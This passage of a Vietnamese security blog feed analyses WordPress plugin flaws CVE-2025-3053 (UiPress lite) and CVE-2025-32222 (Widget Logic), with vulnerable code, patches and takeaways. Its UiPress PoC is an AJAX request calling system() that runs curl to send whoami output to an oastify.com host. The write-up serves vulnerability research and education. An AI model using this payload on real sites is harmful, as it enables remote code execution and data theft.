ho·∫∑c √≠t nh·∫•t l√† &lt;strong&gt;Arbitrary Function Call&lt;/strong&gt;, cho ph√©p attacker ƒë√£ x√°c th·ª±c (v√≠ d·ª•: Subscriber tr·ªü l√™n) g·ªçi c√°c h√†m nguy hi·ªÉm nh∆∞ &lt;code&gt;system()&lt;/code&gt;, &lt;code&gt;exec()&lt;/code&gt;, &lt;code&gt;shell_exec()&lt;/code&gt;, &lt;code&gt;eval()&lt;/code&gt;‚Ä¶ t·ª´ ƒë√≥ c√≥ th·ªÉ th·ª±c thi l·ªánh tr√™n m√°y ch·ªß ho·∫∑c thao t√∫ng h·ªá th·ªëng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v3.5.08):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function uip_process_form_input()&#xA;{&#xA;    // Check security nonce and &amp;#39;DOING_AJAX&amp;#39; global&#xA;    Ajax::check_referer();&#xA;&#xA;    Ajax::error(__(&amp;#34;Passing form data to user specified functions has been disabled to prevent potential security issues.&amp;#34;, &amp;#34;uipress-lite&amp;#34;));&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ v√° l·∫°i b·∫±ng c√°ch lo·∫°i b·ªè logic c·ªßa h√†m n√†y :)).&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/diff.png&#39; alt=&#34;Diff&#34; height=&#34;583&#34; width=&#34;1894&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;public function load_ajax()&#xA;{&#xA;    $function_names = [&#xA;        &amp;#34;uip_get_users_and_roles&amp;#34;,&#xA;        &amp;#34;uip_get_post_types&amp;#34;,&#xA;        &amp;#34;uip_get_recent_posts&amp;#34;,&#xA;        &amp;#34;uip_get_posts_for_table&amp;#34;,&#xA;        &amp;#34;uip_get_post_table_columns&amp;#34;,&#xA;        &amp;#34;uip_delete_post&amp;#34;,&#xA;        &amp;#34;uip_save_user_preference&amp;#34;,&#xA;        &amp;#34;uip_get_user_preference&amp;#34;,&#xA;        &amp;#34;uip_search_content&amp;#34;,&#xA;        &amp;#34;uip_process_form_input&amp;#34;,&#xA;        &amp;#34;uip_send_form_email&amp;#34;,&#xA;        &amp;#34;uip_save_form_as_option&amp;#34;,&#xA;        &amp;#34;uip_save_form_as_user_option&amp;#34;,&#xA;        &amp;#34;uip_pre_populate_form_data&amp;#34;,&#xA;        &amp;#34;uip_create_frame_switch&amp;#34;,&#xA;        &amp;#34;uip_get_sync_options&amp;#34;,&#xA;        &amp;#34;uip_refresh_sync_key&amp;#34;,&#xA;        &amp;#34;uip_save_sync_options&amp;#34;,&#xA;        &amp;#34;uip_start_site_sync&amp;#34;,&#xA;        &amp;#34;uip_check_for_template_updates&amp;#34;,&#xA;        &amp;#34;uip_process_block_query&amp;#34;,&#xA;        &amp;#34;uip_save_site_option&amp;#34;,&#xA;        &amp;#34;uip_send_message_to_gpt&amp;#34;,&#xA;        &amp;#34;uip_global_export&amp;#34;,&#xA;        &amp;#34;uip_global_import&amp;#34;,&#xA;        &amp;#34;uip_push_new_custom_menu_items&amp;#34;,&#xA;        &amp;#34;uip_remove_custom_menu_items&amp;#34;,&#xA;    ];&#xA;&#xA;    // Push ajax actions&#xA;    foreach ($function_names as $name) {&#xA;        add_action(&amp;#34;wp_ajax_{$name}&amp;#34;, [$this, $name]);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω m·ªôt lo·∫°t c√°c AJAX action th√¥ng qua h√†m &lt;code&gt;load_ajax()&lt;/code&gt;, m·ªói t√™n trong m·∫£ng &lt;code&gt;$function_names&lt;/code&gt; ƒë∆∞·ª£c g·∫Øn v·ªõi &lt;code&gt;add_action(&amp;quot;wp_ajax_{$name}&amp;quot;, [$this, $name])&lt;/code&gt;. ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† khi g·ª≠i y√™u c·∫ßu ƒë·∫øn &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; k√®m tham s·ªë &lt;code&gt;action = $name&lt;/code&gt;, WordPress s·∫Ω g·ªçi tr·ª±c ti·∫øp ph∆∞∆°ng th·ª©c c√≥ c√πng t√™n trong class c·ªßa plugin.&lt;/p&gt;&#xA;&lt;p&gt;Trong danh s√°ch n√†y c√≥ &lt;code&gt;uip_process_form_input&lt;/code&gt;, v√¨ v·∫≠y m·ªôt request nh∆∞:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php&#xA;action=uip_process_form_input&amp;amp;security=...&amp;amp;formData=...&amp;amp;userFunction=...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;s·∫Ω k√≠ch ho·∫°t h√†m &lt;code&gt;uip_process_form_input()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php...action=uip_process_form_input&amp;#34;] --&amp;gt; B[&amp;#34;WordPress g·ªçi uip_process_form_input()&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Ajax::check_referer()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$data = json_decode(formData)&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;$userFunction = sanitize_text_field(userFunction)&amp;#34;]&#xA;E --&amp;gt; F{&amp;#34;function_exists($userFunction)?&amp;#34;}&#xA;F --&amp;gt;|Yes| G[&amp;#34;$userFunction($data)&amp;#34;]&#xA;F --&amp;gt;|No| H[&amp;#34;Ajax::error()&amp;#34;]&#xA;G --&amp;gt; I[&amp;#34;wp_send_json(success)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;ƒêƒÉng nh·∫≠p v·ªõi user &lt;strong&gt;Subcriber&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;L·∫•y security t·ª´ response&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#34; title=&#34;Gi√° tr·ªã security&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/security.png&#34; data-sub-html=&#34;&lt;h2&gt;Security value&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã security&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/security.png&#39; alt=&#34;Security value&#34; height=&#34;637&#34; width=&#34;1485&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã security&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;G·ª≠i request ch·ª©a payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;...&#xA;action=uip_process_form_input&amp;amp;security=65c1a4e801&amp;amp;formData=&amp;#34;curl&amp;#43;http://1aclwhon6rw1l1bj569pxpkjqaw1ks8h.oastify.com?leadked=$(whoami)&amp;#34;&amp;amp;userFunction=system&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-12-01-cve-2025-3053/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-01-cve-2025-3053/result.png&#39; alt=&#34;Result&#34; height=&#34;579&#34; width=&#34;1049&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-3053&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác &lt;code&gt;uip_process_form_input()&lt;/code&gt; cho ph√©p ng∆∞·ªùi d√πng ki·ªÉm so√°t tr·ª±c ti·∫øp &lt;strong&gt;t√™n h√†m ƒë∆∞·ª£c th·ª±c thi&lt;/strong&gt; th√¥ng qua &lt;code&gt;userFunction&lt;/code&gt;, ch·ªâ ki·ªÉm tra b·∫±ng &lt;code&gt;function_exists()&lt;/code&gt; v√† &lt;strong&gt;kh√¥ng c√≥ capability check hay whitelist&lt;/strong&gt;. ƒêi·ªÅu n√†y khi·∫øn ng∆∞·ªùi d√πng ƒë√£ x√°c th·ª±c ·ªü m·ª©c th·∫•p (Subscriber) c√≥ th·ªÉ th·ª±c hi·ªán &lt;strong&gt;Arbitrary Function Call&lt;/strong&gt;, d·∫´n t·ªõi &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;. Phi√™n b·∫£n &lt;strong&gt;3.5.08&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch v√¥ hi·ªáu h√≥a ho√†n to√†n c∆° ch·∫ø n√†y.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng cho ph√©p user ki·ªÉm so√°t &lt;strong&gt;dynamic function call&lt;/strong&gt; n·∫øu kh√¥ng c√≥ whitelist.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; / &lt;code&gt;check_ajax_referer()&lt;/code&gt; &lt;strong&gt;kh√¥ng thay th·∫ø&lt;/strong&gt; cho &lt;code&gt;current_user_can()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;function_exists()&lt;/code&gt; &lt;strong&gt;kh√¥ng ph·∫£i c∆° ch·∫ø b·∫£o m·∫≠t&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;L·ªói logic nguy hi·ªÉm h∆°n sanitize sai d·ªØ li·ªáu.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n √°p d·ª•ng nguy√™n t·∫Øc &lt;strong&gt;least privilege&lt;/strong&gt; cho c√°c AJAX endpoint.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-07-authenticated-subscriber-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.07 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32222 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-30-cve-2025-32222/</link>
      <pubDate>Sun, 30 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-30-cve-2025-32222/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-30-cve-2025-32222/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Improper Control of Generation of Code (&amp;lsquo;Code Injection&amp;rsquo;)&lt;/strong&gt; trong Widgetlogic.org &lt;strong&gt;Widget Logic (widget-logic)&lt;/strong&gt; cho ph√©p &lt;strong&gt;Code Injection&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng t·ªõi Widget Logic t·ª´ phi√™n b·∫£n &lt;strong&gt;n/a ƒë·∫øn &amp;lt;= 6.0.5&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32222&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32222&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.0.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.0.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/widget-logic/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Widget Logic Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Widget Logic&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.5&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.0.6&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v6.0.5):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function widget_logic_check_logic($logic)&#xA;{&#xA;    $logic = @trim((string) $logic);&#xA;    $logic = apply_filters(&amp;#34;widget_logic_eval_override&amp;#34;, $logic);&#xA;&#xA;    if (is_bool($logic)) {&#xA;        return $logic;&#xA;    }&#xA;&#xA;    if ($logic === &amp;#39;&amp;#39;) {&#xA;        return true;&#xA;    }&#xA;&#xA;    if (stristr($logic, &amp;#39;return&amp;#39;) === false) {&#xA;        $logic = &amp;#39;return (&amp;#39; . html_entity_decode($logic, ENT_COMPAT | ENT_HTML401 | ENT_QUOTES) . &amp;#39;);&amp;#39;;&#xA;    }&#xA;&#xA;    set_error_handler(&amp;#39;widget_logic_error_handler&amp;#39;); // phpcs:ignore -- we have mode for debugging for admins&#xA;&#xA;    try {&#xA;        $show_widget = 